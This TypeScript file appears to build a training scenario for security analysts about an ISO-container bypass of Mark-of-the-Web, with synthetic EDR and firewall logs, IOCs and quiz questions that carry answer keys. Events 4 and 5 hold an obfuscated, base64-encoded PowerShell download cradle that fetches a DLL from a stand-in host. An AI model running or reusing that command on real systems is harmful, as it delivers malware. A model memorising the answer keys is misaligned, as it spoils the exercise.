/**
 * Scenario pack: "Invoice.iso — Container Smuggling Past the Mark of the Web"
 *
 * FOUNDATION tier. One user, one laptop, no lateral movement, no cross-account
 * credential theft, no cloud pivot. An accounts-payable clerk follows a link to
 * what looks like an overdue invoice and downloads Invoice_84421.iso. Windows
 * tags the ISO itself with a Mark-of-the-Web zone identifier because it came
 * from the internet — but when she double-clicks it, Windows mounts it as a
 * new drive letter, and the Mark-of-the-Web does **not** propagate to the
 * files inside the container. A shortcut sitting on that new drive runs
 * without the SmartScreen prompt a .exe downloaded directly to her Downloads
 * folder would have triggered.
 *
 * This is the post-macro-block delivery pattern several loader families
 * (QakBot, IcedID, Bumblebee) adopted once Microsoft disabled Office macros
 * from the internet by default in 2022: ship the payload inside a container
 * format Windows will mount but won't mark. Covers T1553.005 (Subvert Trust
 * Controls: Mark-of-the-Web Bypass), T1204.002 (User Execution: Malicious
 * File) and T1059.001 (Command and Scripting Interpreter: PowerShell).
 *
 * SOURCE-LIGHT: only `edr` (CrowdStrike Falcon) and `firewall` (Fortinet
 * FortiGate) events.
 *
 * NOTE: `difficulty: "foundation"` is declared on the SCENARIOS registry entry
 * in scenarios.ts (ScenarioBundle itself carries no difficulty field).
 */

import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";

export function buildIsoContainerSmugglingScenario(
  scenarioId = "iso-container-smuggling-2026",
): ScenarioBundle {
  const B = new Date("2026-04-14T10:05:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const host = { hostname: "LAP-5528", ip: "10.14.33.91" };
  const victim = { email: "n.katz@nexacorp.com", name: "Noa Katz", sam: "n.katz" };
  const sensorId = "e6d92c1804bf47a1a3d0e29fc61b8a72";

  const shareSite = "invoice-doc-share.net";
  const c2 = "cdn-update-relay.net";

  const isoHash = makeSha256("invoice_84421_iso_container_smuggling_2026");
  const payloadHash = makeSha256("cdn_update_relay_core_dll_payload_2026");

  const events: TelemetryEvent[] = [
    // ---------------------------------------------------------------------
    // 1. The download. An ISO, not an executable — nothing here trips a
    //    file-type block on its own.
    // ---------------------------------------------------------------------
    {
      id: "evt_ics_01_download",
      ts: T(0),
      source: "firewall",
      vendor: "Fortinet FortiGate",
      event_type: "http_request",
      hostname: host.hostname,
      user_email: victim.email,
      user_title: "Accounts Payable Clerk",
      src_ip: host.ip,
      severity: "low",
      description:
        "LAP-5528 downloaded Invoice_84421.iso, 6.8 MB, from invoice-doc-share.net at 10:05, logged by the file-filter profile as log-only.",
      file: { name: "Invoice_84421.iso", path: "/dl/Invoice_84421.iso", extension: "iso", size: 7_129_088, sha256: isoHash },
      network: {
        url: `https://${shareSite}/dl/Invoice_84421.iso`,
        domain: shareSite,
        method: "GET",
        status: 200,
        bytes_in: 7_129_088,
      },
      raw: {
        "data.type": "utm",
        "data.subtype": "filefilter",
        "data.eventtype": "filefilter",
        "data.level": "warning",
        "data.action": "log-only",
        "data.logdesc": "File filter",
        "data.msg": "File filter event",
        "data.filename": "Invoice_84421.iso",
        "data.filetype": "iso",
        "data.url": `${shareSite}/dl/Invoice_84421.iso`,
        "data.hostname": shareSite,
        "data.srcip": host.ip,
        "data.dstip": "104.21.61.90",
        "data.dstport": "443",
        "data.srcport": "51422",
        "data.proto": "6",
        "data.service": "HTTPS",
        "data.policyid": "14",
        "data.srcintf": "internal",
        "data.dstintf": "wan1",
        "data.devname": "FGT-CORE-01",
        "data.devid": "FGT60F1234567890",
        "data.vd": "root",
        "data.srccountry": "Reserved",
        "data.dstcountry": "United States",
        "data.time": "10:05:00",
        "action_result": "allowed",
      },
    },

    // ---------------------------------------------------------------------
    // 2. The file lands, carrying a Mark-of-the-Web tag because it came
    //    straight from the internet — this detail matters for what follows.
    // ---------------------------------------------------------------------
    {
      id: "evt_ics_02_file_write",
      ts: T(6_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "file_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "low",
      description:
        "chrome.exe wrote C:\\Users\\n.katz\\Downloads\\Invoice_84421.iso at 10:05:06, tagged with a Zone.Identifier alternate data stream (ZoneId=3, Internet) — the normal Mark-of-the-Web Windows applies to anything downloaded from the web.",
      file: {
        name: "Invoice_84421.iso",
        path: "C:\\Users\\n.katz\\Downloads\\Invoice_84421.iso",
        extension: "iso",
        size: 7_129_088,
        sha256: isoHash,
      },
      raw: {
        "crowdstrike.event_simpleName": "NewExecutableWritten",
        "crowdstrike.sensor.id": sensorId,
        "event.action": "file_created",
        "file.name": "Invoice_84421.iso",
        "file.path": "C:\\Users\\n.katz\\Downloads\\Invoice_84421.iso",
        "file.extension": "iso",
        "file.size": "7129088",
        "file.hash.sha256": isoHash,
        "process.name": "chrome.exe",
        "process.pid": "6204",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 3. She double-clicks it. Explorer's built-in ISO mount handler
    //    presents it as a new drive, D:\.
    // ---------------------------------------------------------------------
    {
      id: "evt_ics_03_mount",
      ts: T(4 * MIN + 20_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "file_access",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "medium",
      mitre_technique: "T1204.002",
      mitre_tactic: "Execution",
      description:
        "At 10:09:20 explorer.exe opened Invoice_84421.iso. Windows' native container mount handler (shell32.dll) presented it as drive D:\\, exposing Invoice_84421.lnk and update.dat inside.",
      file: {
        name: "Invoice_84421.iso",
        path: "C:\\Users\\n.katz\\Downloads\\Invoice_84421.iso",
        extension: "iso",
        sha256: isoHash,
      },
      process: {
        name: "explorer.exe",
        pid: 3184,
        path: "C:\\Windows\\explorer.exe",
        user: `NEXACORP\\${victim.sam}`,
        integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "FileOpenInfo",
        "crowdstrike.sensor.id": sensorId,
        "event.action": "file_opened",
        "file.name": "Invoice_84421.iso",
        "file.path": "C:\\Users\\n.katz\\Downloads\\Invoice_84421.iso",
        "file.hash.sha256": isoHash,
        "process.name": "explorer.exe",
        "process.pid": "3184",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 4. THE EVENT THAT MATTERS — the shortcut inside the mounted volume
    //    runs with no Mark-of-the-Web challenge at all.
    // ---------------------------------------------------------------------
    {
      id: "evt_ics_04_lnk_cmd",
      ts: T(4 * MIN + 34_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "high",
      mitre_technique: "T1553.005",
      mitre_tactic: "Defense Evasion",
      description:
        "Fourteen seconds later she double-clicked Invoice_84421.lnk on D:\\. explorer.exe resolved its target and launched cmd.exe — with no SmartScreen prompt, because the Mark-of-the-Web on the ISO does not carry over to files inside the mounted container.",
      process: {
        name: "cmd.exe",
        pid: 6620,
        path: "C:\\Windows\\System32\\cmd.exe",
        parent_name: "explorer.exe",
        parent_pid: 3184,
        cmdline:
          'cmd.exe /c powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGMAZABuAC0AdQBwAGQAYQB0AGUALQByAGUAbABhAHkALgBuAGUAdAAvAG0AbwBkAC8AYwBvAHIAZQAuAGQAbABsACcALAAnAEMAOgBcAFUAcwBlAHIAcwBcAG4ALgBrAGEAdAB6AFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABjAG8AcgBlAC4AZABsAGwAJwApAA==',
        user: `NEXACORP\\${victim.sam}`,
        integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.detection.tactic": "Defense Evasion",
        "crowdstrike.detection.tactic_id": "TA0005",
        "crowdstrike.detection.technique": "Subvert Trust Controls: Mark-of-the-Web Bypass",
        "crowdstrike.detection.technique_id": "T1553.005",
        "crowdstrike.detection.severity": "High",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.sensor.id": sensorId,
        "crowdstrike.network_containment_state": "Not Contained",
        "event.action": "process_created",
        "process.name": "cmd.exe",
        "process.pid": "6620",
        "process.executable": "C:\\Windows\\System32\\cmd.exe",
        "process.command_line":
          'cmd.exe /c powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGMAZABuAC0AdQBwAGQAYQB0AGUALQByAGUAbABhAHkALgBuAGUAdAAvAG0AbwBkAC8AYwBvAHIAZQAuAGQAbABsACcALAAnAEMAOgBcAFUAcwBlAHIAcwBcAG4ALgBrAGEAdAB6AFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABjAG8AcgBlAC4AZABsAGwAJwApAA==',
        "process.parent.name": "explorer.exe",
        "process.parent.pid": "3184",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 5. cmd.exe hands off to a hidden PowerShell interpreter.
    // ---------------------------------------------------------------------
    {
      id: "evt_ics_05_powershell",
      ts: T(4 * MIN + 35_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "critical",
      mitre_technique: "T1059.001",
      mitre_tactic: "Execution",
      description:
        "One second later cmd.exe spawned powershell.exe with a hidden window and a base64-encoded command.",
      process: {
        name: "powershell.exe",
        pid: 6631,
        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent_name: "cmd.exe",
        parent_pid: 6620,
        cmdline:
          "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGMAZABuAC0AdQBwAGQAYQB0AGUALQByAGUAbABhAHkALgBuAGUAdAAvAG0AbwBkAC8AYwBvAHIAZQAuAGQAbABsACcALAAnAEMAOgBcAFUAcwBlAHIAcwBcAG4ALgBrAGEAdAB6AFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABjAG8AcgBlAC4AZABsAGwAJwApAA==",
        user: `NEXACORP\\${victim.sam}`,
        integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
        "crowdstrike.detection.technique_id": "T1059.001",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.sensor.id": sensorId,
        "crowdstrike.network_containment_state": "Not Contained",
        "event.action": "process_created",
        "process.name": "powershell.exe",
        "process.pid": "6631",
        "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.command_line":
          "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGMAZABuAC0AdQBwAGQAYQB0AGUALQByAGUAbABhAHkALgBuAGUAdAAvAG0AbwBkAC8AYwBvAHIAZQAuAGQAbABsACcALAAnAEMAOgBcAFUAcwBlAHIAcwBcAG4ALgBrAGEAdAB6AFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABjAG8AcgBlAC4AZABsAGwAJwApAA==",
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "6620",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 6. The decoded command's actual target: a follow-on payload.
    // ---------------------------------------------------------------------
    {
      id: "evt_ics_06_payload_fetch",
      ts: T(4 * MIN + 37_000),
      source: "firewall",
      vendor: "Fortinet FortiGate",
      event_type: "http_request",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "critical",
      description:
        "Two seconds after PowerShell started, LAP-5528 fetched core.dll, 2.4 MB, from cdn-update-relay.net — a domain with no relationship to invoice-doc-share.net, passed through as an uncategorised URL.",
      file: { name: "core.dll", path: "/mod/core.dll", extension: "dll", size: 2_516_582, sha256: payloadHash },
      network: {
        url: `https://${c2}/mod/core.dll`,
        domain: c2,
        method: "GET",
        status: 200,
        bytes_in: 2_516_582,
      },
      raw: {
        "data.type": "utm",
        "data.subtype": "webfilter",
        "data.eventtype": "ftgd_allow",
        "data.level": "notice",
        "data.action": "passthrough",
        "data.msg": "URL belongs to an allowed category",
        "data.cat": "26",
        "data.catdesc": "Uncategorized",
        "data.url": `${c2}/mod/core.dll`,
        "data.hostname": c2,
        "data.srcip": host.ip,
        "data.dstip": "193.106.191.42",
        "data.dstport": "443",
        "data.proto": "6",
        "data.service": "HTTPS",
        "data.policyid": "22",
        "data.devname": "FGT-CORE-01",
        "data.devid": "FGT60F1234567890",
        "data.vd": "root",
        "data.srccountry": "Reserved",
        "data.dstcountry": "Romania",
        "data.time": "10:09:37",
        "action_result": "allowed",
      },
    },

    // ---------------------------------------------------------------------
    // 7. It lands on disk.
    // ---------------------------------------------------------------------
    {
      id: "evt_ics_07_payload_write",
      ts: T(4 * MIN + 39_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "file_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "high",
      description:
        "powershell.exe wrote C:\\Users\\n.katz\\AppData\\Roaming\\core.dll, unsigned, 2.4 MB.",
      file: {
        name: "core.dll",
        path: "C:\\Users\\n.katz\\AppData\\Roaming\\core.dll",
        extension: "dll",
        size: 2_516_582,
        sha256: payloadHash,
      },
      raw: {
        "crowdstrike.event_simpleName": "NewExecutableWritten",
        "crowdstrike.sensor.id": sensorId,
        "event.action": "file_created",
        "file.name": "core.dll",
        "file.path": "C:\\Users\\n.katz\\AppData\\Roaming\\core.dll",
        "file.extension": "dll",
        "file.size": "2516582",
        "file.hash.sha256": payloadHash,
        "file.signature.status": "unsigned",
        "process.name": "powershell.exe",
        "process.pid": "6631",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
      },
    },

    // ---------------------------------------------------------------------
    // 8. Falcon catches up and kills the interpreter before the DLL loads.
    // ---------------------------------------------------------------------
    {
      id: "evt_ics_08_edr_alert",
      ts: T(4 * MIN + 45_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "edr_alert",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "critical",
      description:
        "Falcon raised a Critical detection on LAP-5528 for the explorer → cmd → powershell chain originating from a mounted ISO volume, and killed the PowerShell process before core.dll could be loaded.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.detection.name": "ContainerMountedShortcutSpawnedEncodedPowerShell",
        "crowdstrike.detection.description":
          "A shortcut resolved from a mounted ISO/IMG volume launched a command interpreter, which spawned PowerShell with an encoded command and no Mark-of-the-Web challenge.",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.detection.confidence": "88",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
        "crowdstrike.detection.technique_id": "T1059.001",
        "crowdstrike.detection.pattern_disposition_description": "Detection, Process Killed",
        "crowdstrike.detection.parent_process": "explorer.exe",
        "crowdstrike.detection.process_tree": "explorer.exe > cmd.exe > powershell.exe",
        "crowdstrike.sensor.id": sensorId,
        "crowdstrike.network_containment_state": "Not Contained",
        "crowdstrike.falcon_host_link": "https://falcon.crowdstrike.com/activity/detections/detail/e6d92c18",
        "event.action": "alert",
        "event.outcome": "blocked",
        "host.name": host.hostname,
        "host.ip": host.ip,
        "user.name": `NEXACORP\\${victim.sam}`,
      },
    },
  ];

  const iocs: IOC[] = [
    {
      type: "sha256",
      value: isoHash,
      first_seen: T(0),
      last_seen: T(4 * MIN + 34_000),
      reputation: "malicious",
      tags: ["iso-container", "mark-of-the-web-bypass"],
    },
    {
      type: "sha256",
      value: payloadHash,
      first_seen: T(4 * MIN + 37_000),
      last_seen: T(4 * MIN + 45_000),
      reputation: "malicious",
      tags: ["second-stage", "unsigned", "dll"],
    },
    {
      type: "domain",
      value: shareSite,
      first_seen: T(0),
      last_seen: T(0),
      reputation: "malicious",
      tags: ["lure-hosting", "invoice-theme"],
    },
    {
      type: "domain",
      value: c2,
      first_seen: T(4 * MIN + 37_000),
      last_seen: T(4 * MIN + 37_000),
      reputation: "malicious",
      tags: ["c2", "payload-staging"],
    },
    {
      type: "host",
      value: host.hostname,
      first_seen: T(0),
      last_seen: T(4 * MIN + 45_000),
      reputation: "unknown",
      tags: ["user-endpoint", "affected"],
    },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1",
      prompt:
        "Invoice_84421.iso itself carried a Mark-of-the-Web zone tag (evt_ics_02), yet Invoice_84421.lnk ran from inside it with no SmartScreen prompt at all (evt_ics_04). Why?",
      hint: "Compare what got tagged in evt_ics_02 with what actually executed in evt_ics_04 — are they the same file object?",
      kind: "single",
      options: [
        { value: "no_propagation", label: "Windows tags the downloaded container file, not the files inside it once mounted — the mark doesn't propagate to the mounted volume's contents" },
        { value: "trusted_signer", label: "The .lnk was signed by a trusted publisher, so SmartScreen waived the check" },
        { value: "smartscreen_off", label: "SmartScreen must have been disabled in this environment's security policy" },
        { value: "already_scanned", label: "The ISO had already been scanned and cleared when it was downloaded, so its contents were pre-approved" },
      ],
      answer: "no_propagation",
      xp: 60,
      explanation:
        "Mark-of-the-Web is a property of the individual downloaded file — the Zone.Identifier alternate data stream Windows writes onto Invoice_84421.iso itself. When Windows mounts that ISO as a new volume, the files it exposes (Invoice_84421.lnk, update.dat) are read directly off the mounted container and never go through their own internet-download path — so they never get their own Zone.Identifier, and nothing prompts. This is exactly why loader families moved to container formats once Office blocked macros from the internet by default. (b) invents a signature that isn't in the evidence — nothing in evt_ics_04 shows a code signature at all. (c) and (d) both assume facts nowhere in the log; the absence of a prompt is explained by the mount mechanism, not by a policy being off or a scan having occurred.",
    },
    {
      id: "q2",
      prompt:
        "cdn-update-relay.net was passed through FortiGate's web filter under category 'Uncategorized' (data.cat: 26). What does that tell you about relying on URL category as a control here?",
      kind: "single",
      options: [
        { value: "gap", label: "Fresh attacker infrastructure often has no category yet, and 'Uncategorized' is commonly passthrough rather than blocked by default" },
        { value: "misconfig", label: "Uncategorized domains should always be blocked; this is a FortiGate misconfiguration" },
        { value: "tls_gap", label: "The filter couldn't see the request because it was encrypted" },
        { value: "known_good", label: "'Uncategorized' means FortiGate has confirmed the domain is benign" },
      ],
      answer: "gap",
      xp: 50,
      explanation:
        "FortiWeb's category database can only classify domains it has crawled or received threat-intel on; brand-new attacker infrastructure routinely starts life Uncategorized, and many organisations leave that bucket on passthrough because blocking it wholesale breaks too many legitimate new sites. The log itself proves TLS visibility was fine — full URL, filename, and byte counts are present — so (c) is contradicted by the evidence. (b) assumes a specific policy stance the log doesn't state, and (d) inverts what 'Uncategorized' actually means: it's an absence of classification, not a positive verdict.",
    },
    {
      id: "q3",
      prompt:
        "Which two events, read together, tell you cmd.exe was only ever a relay and not the actual payload?",
      kind: "single",
      options: [
        { value: "cmd_and_ps", label: "evt_ics_04_lnk_cmd and evt_ics_05_powershell — cmd.exe's own command line is nothing but a call to launch powershell.exe with the real payload" },
        { value: "iso_and_mount", label: "evt_ics_01_download and evt_ics_03_mount — the ISO download and the mount action" },
        { value: "ps_and_fetch", label: "evt_ics_05_powershell and evt_ics_06_payload_fetch — PowerShell starting and the DLL being fetched" },
        { value: "fetch_and_write", label: "evt_ics_06_payload_fetch and evt_ics_07_payload_write — the DLL being downloaded and then written to disk" },
      ],
      answer: "cmd_and_ps",
      xp: 60,
      explanation:
        "process.command_line on evt_ics_04 shows cmd.exe's entire job was `/c powershell.exe -NoP -W Hidden -Enc ...` — it carries no logic of its own, only an instruction to start a second interpreter with an encoded payload. evt_ics_05 confirms that handoff: powershell.exe appears one second later as cmd.exe's direct child, carrying the same encoded command. That pairing is what shows cmd.exe is a pass-through proxy, a pattern common to LOLBAS-style execution chains. (c) and (d) are both real correlated pairs in this incident, but they describe what PowerShell did once running, not what cmd.exe was for. (b) shows delivery and mounting, not execution proxying.",
    },
    {
      id: "q4",
      prompt:
        "Falcon's pattern_disposition_description on evt_ics_08 reads 'Detection, Process Killed'. What is and isn't true about the host's state at that point?",
      kind: "single",
      options: [
        { value: "dll_landed", label: "PowerShell was stopped, but core.dll had already been written to AppData\\Roaming before the kill" },
        { value: "fully_clean", label: "The kill fully remediated the incident — nothing malicious remains on the host" },
        { value: "dll_executed", label: "core.dll had already been loaded and was actively running when Falcon intervened" },
        { value: "nothing_ran", label: "Nothing reached disk; Falcon blocked the chain before any file operations completed" },
      ],
      answer: "dll_landed",
      xp: 60,
      explanation:
        "evt_ics_07 is timestamped before evt_ics_08 and shows core.dll already written to disk by powershell.exe. Killing the PowerShell process (evt_ics_08) stopped that process from doing anything further — including loading the DLL it had just fetched — but it does not undo the write that already happened. (b) overstates the outcome: an unsigned DLL is still sitting on the host and needs to be removed and analysed, not assumed gone. (c) isn't supported — nothing in the timeline shows a loader (rundll32 or similar) executing core.dll; only the write is evidenced. (d) is contradicted directly by evt_ics_07's timestamp, which precedes the kill.",
    },
    {
      id: "q5",
      prompt:
        "You're writing the remediation plan. Which step addresses the actual mechanism that let this bypass the usual file-download warning?",
      kind: "single",
      options: [
        { value: "policy_container", label: "Add container formats (.iso, .img, .vhd) to the file-filter policy alongside executables, since Windows won't tag their contents" },
        { value: "block_exe_only", label: "Extend the existing block on downloaded .exe files — that policy already covers the risk here" },
        { value: "disable_lnk", label: "Disable .lnk file execution organisation-wide" },
        { value: "revoke_cert", label: "Revoke the code-signing certificate used to sign the payload" },
      ],
      answer: "policy_container",
      xp: 50,
      explanation:
        "The reason this chain worked at all is that Invoice_84421.iso is a container, not an executable — a policy that only inspects or blocks .exe downloads never sees it, exactly as evt_ics_01 shows (logged, not blocked, under a file-filter profile that evidently doesn't treat .iso as high-risk). Treating container formats the same way executables are treated closes the actual gap. (b) restates a control that was never in this chain's path — nothing here was a directly downloaded .exe. (c) is disproportionate and would break a huge amount of legitimate shortcut use for one incident's delivery mechanism. (d) doesn't apply — nothing in this evidence shows a code signature on any file at all; the payload is unsigned.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "Invoice.iso — Container Smuggling Past the Mark of the Web",
    threat_actor: "Commodity loader operator (container smuggling)",
    attack_kind: "iso_container_smuggling",
    briefing:
      "CrowdStrike Falcon raised a Critical detection on LAP-5528 at 10:09 for a hidden PowerShell process spawned through cmd.exe. The user says she opened what she thought was an overdue invoice this morning. Work out how the file got there and how it ran without triggering the warning a downloaded .exe normally would.",
    narrative: `At 10:05 Noa Katz, an accounts-payable clerk, downloaded Invoice_84421.iso from invoice-doc-share.net — 6.8 MB, logged by FortiGate's file-filter profile as log-only because .iso isn't on the list of types that get blocked outright. Six seconds later it landed in her Downloads folder carrying a Zone.Identifier alternate data stream, the ordinary Mark-of-the-Web Windows stamps on anything pulled from the internet.

At 10:09:20 she double-clicked it. Windows' own container-mount handler presented it as a new drive, D:\\, holding two files: Invoice_84421.lnk and update.dat. Fourteen seconds later she double-clicked the shortcut. explorer.exe resolved its target and launched cmd.exe — with no SmartScreen prompt at all, because the Mark-of-the-Web that had been sitting on the ISO belongs to that file object alone. Nothing inside a mounted container inherits it.

cmd.exe's entire command line was a single instruction: start powershell.exe, hidden, with a base64-encoded command. It did, one second later. The decoded command downloaded core.dll, 2.4 MB, from cdn-update-relay.net — infrastructure with no connection to invoice-doc-share.net — and wrote it to C:\\Users\\n.katz\\AppData\\Roaming. FortiGate's web filter passed the request through; the domain had no category yet.

Falcon's detection caught up six seconds after PowerShell started and killed the process before it could load what it had just downloaded. core.dll is still sitting on the host — the kill stopped the process that fetched it, not the file itself.`,
    learning_objectives: [
      "Recognise container smuggling (T1553.005) — a Mark-of-the-Web bypass where the tag on a downloaded ISO/IMG doesn't propagate to files exposed once it's mounted",
      "Read a firewall's file-filter and web-category fields to understand why an unusual container type and a fresh domain both slipped through",
      "Correlate a parent process's command line with its child's process-creation event to identify a pass-through relay versus the actual execution engine",
      "Distinguish 'the process was killed' from 'the file it wrote is gone' when assessing host state after a detection",
      "Recommend remediation that targets the actual delivery mechanism (container formats) rather than a control the incident never passed through",
    ],
    alerts: [],
    events,
    iocs,
    killchain: [
      { ts: T(0), phase: "Initial Access", action: `Invoice_84421.iso downloaded from ${shareSite}` },
      { ts: T(4 * MIN + 20_000), phase: "Execution", action: "User opens the ISO; Windows mounts it as D:\\ (T1204.002)" },
      { ts: T(4 * MIN + 34_000), phase: "Defense Evasion", action: "Invoice_84421.lnk launches cmd.exe with no Mark-of-the-Web challenge (T1553.005)" },
      { ts: T(4 * MIN + 35_000), phase: "Execution", action: "cmd.exe spawns hidden, encoded PowerShell (T1059.001)" },
      { ts: T(4 * MIN + 37_000), phase: "Command and Control", action: `core.dll fetched from ${c2}, passed through as Uncategorized` },
      { ts: T(4 * MIN + 39_000), phase: "Execution", action: "core.dll written to AppData\\Roaming" },
      { ts: T(4 * MIN + 45_000), phase: "Detection", action: "Falcon kills the PowerShell process — core.dll remains on disk, unloaded" },
    ],
    questions,
  };
}
